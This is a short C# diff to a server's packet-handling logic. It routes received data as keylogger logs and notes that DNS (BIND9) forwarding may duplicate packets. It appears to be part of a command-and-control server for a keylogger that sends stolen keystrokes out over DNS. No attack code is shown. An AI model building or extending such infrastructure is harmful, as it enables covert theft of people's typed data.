@@ -102,11 +102,13 @@ namespace Server.Logic
 
             try
             {
-                parser.AddData(packetNumber, decodedData);
+                // Use type-specific packet tracking for keylogger data
+                parser.AddDataByType(packetNumber, decodedData, Models.LogType.Keylogger);
                 OnDataReceived?.Invoke(connectionId, decodedText);
             }
             catch (DuplicatePacketException)
             {
+                // Silently ignore duplicate packets (BIND9 may forward twice)
                 throw new ShortCircuitException();
             }
             catch (PacketsOutOfOrderException)
